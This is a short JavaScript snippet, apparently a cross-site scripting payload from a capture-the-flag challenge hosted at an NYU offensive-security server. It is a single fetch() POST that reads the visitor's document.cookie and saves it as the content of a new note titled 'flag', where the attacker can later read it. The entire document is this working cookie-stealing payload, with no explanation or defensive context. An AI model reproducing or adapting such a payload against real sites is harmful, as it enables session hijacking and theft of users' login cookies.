fetch("http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new", {
method: 'POST',
headers: {
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'Accept-Encoding': 'gzip, deflate',
  'Content-Type': 'application/x-www-form-urlencoded',
  'cookie': document.cookie
},

body:"title=flag&content="+document.cookie+"&submit=save",
});